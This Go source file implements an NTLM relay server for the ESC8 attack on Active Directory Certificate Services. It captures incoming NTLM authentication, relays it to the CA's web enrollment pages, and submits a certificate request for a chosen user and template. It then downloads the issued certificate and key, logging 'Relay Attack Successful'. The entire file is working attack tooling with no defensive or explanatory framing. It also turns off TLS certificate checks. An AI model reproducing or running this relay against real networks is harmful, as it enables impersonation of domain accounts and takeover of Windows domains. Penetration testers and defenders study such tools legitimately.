package pki

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// RelayServer implements an HTTP-to-HTTP NTLM relay server for ESC8
type RelayServer struct {
	CAHostname string
	Template   string
	UPN        string
	Cert       *x509.Certificate
	Key        crypto.Signer
	mu         sync.Mutex
	done       chan struct{}
	client     *http.Client
}

func (s *RelayServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	if s.Cert != nil {
		s.mu.Unlock()
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}
	s.mu.Unlock()

	authHeader := r.Header.Get("Authorization")
	if authHeader == "" || !strings.HasPrefix(authHeader, "NTLM ") {
		w.Header().Set("WWW-Authenticate", "NTLM")
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	caURL := fmt.Sprintf("http://%s/certsrv/", s.CAHostname)
	req, _ := http.NewRequest("GET", caURL, nil)
	req.Header.Set("Authorization", authHeader)

	resp, err := s.client.Do(req)
	if err != nil {
		fmt.Printf("[!] Relay failed to connect to CA: %v\n", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	if resp.StatusCode == http.StatusUnauthorized {
		caAuth := resp.Header.Get("WWW-Authenticate")
		if strings.HasPrefix(caAuth, "NTLM ") {
			w.Header().Set("WWW-Authenticate", caAuth)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// If we got 200 OK, the NTLM authentication (Type 3) was successful!
	if resp.StatusCode == http.StatusOK {
		fmt.Printf("[+] Relay: Authentication successful! Submitting CSR...\n")

		certKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			fmt.Printf("[!] Relay: failed to generate key: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		csrDER, err := GenerateCSR(certKey, s.UPN, s.Template)
		if err != nil {
			fmt.Printf("[!] Relay: failed to generate CSR: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		csrB64Raw := base64.StdEncoding.EncodeToString(csrDER)
		var csrB64 string
		for i := 0; i < len(csrB64Raw); i += 76 {
			end := i + 76
			if end > len(csrB64Raw) {
				end = len(csrB64Raw)
			}
			csrB64 += csrB64Raw[i:end] + "\r\n"
		}

		certAttrib := fmt.Sprintf("CertificateTemplate:%s", s.Template)
		formData := url.Values{
			"Mode":             {"newreq"},
			"CertRequest":      {csrB64},
			"CertAttrib":       {certAttrib},
			"Type":             {"pkcs10"},
			"TargetStoreFlags": {"0"},
			"SaveCert":         {"yes"},
		}

		submitURL := fmt.Sprintf("http://%s/certsrv/certfnsh.asp", s.CAHostname)
		formEncoded := formData.Encode()
		req2, _ := http.NewRequest("POST", submitURL, strings.NewReader(formEncoded))
		req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp2, err := s.client.Do(req2)
		if err != nil {
			fmt.Printf("[!] Relay CSR submission failed: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		body, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()

		reqID := extractReqID(string(body))
		if reqID == "" {
			fmt.Printf("[!] Relay CSR failed: could not parse ReqID. CA might have rejected the request.\n")
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}

		fmt.Printf("[+] Relay CSR submitted! ReqID=%s\n", reqID)

		cert, err := downloadCert(s.client, s.CAHostname, "http", reqID)
		if err != nil {
			fmt.Printf("[!] Relay Cert download failed: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		fmt.Printf("[+] Relay Attack Successful! Obtained certificate for %s\n", s.UPN)
		s.mu.Lock()
		s.Cert = cert
		s.Key = certKey
		s.mu.Unlock()

		select {
		case <-s.done:
		default:
			close(s.done)
		}

		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
		return
	}

	http.Error(w, "Unauthorized", http.StatusUnauthorized)
}

// RunRelayServer starts the NTLM HTTP-to-HTTP relay listener and waits for an incoming connection
func RunRelayServer(caHostname, template, upn string, port int, timeout time.Duration) (*x509.Certificate, crypto.Signer, error) {
	s := &RelayServer{
		CAHostname: caHostname,
		Template:   template,
		UPN:        upn,
		done:       make(chan struct{}),
		client: &http.Client{
			Transport: &http.Transport{
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				MaxIdleConnsPerHost: 1, // Force connection reuse for NTLM
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", s.ServeHTTP)

	server := &http.Server{
		Addr:    fmt.Sprintf(":%d", port),
		Handler: mux,
	}

	go server.ListenAndServe()

	fmt.Printf("[*] NTLM Relay Server listening on 0.0.0.0:%d\n", port)

	select {
	case <-s.done:
		server.Close()
		return s.Cert, s.Key, nil
	case <-time.After(timeout):
		server.Close()
		return nil, nil, fmt.Errorf("relay server timed out waiting for connection")
	}
}
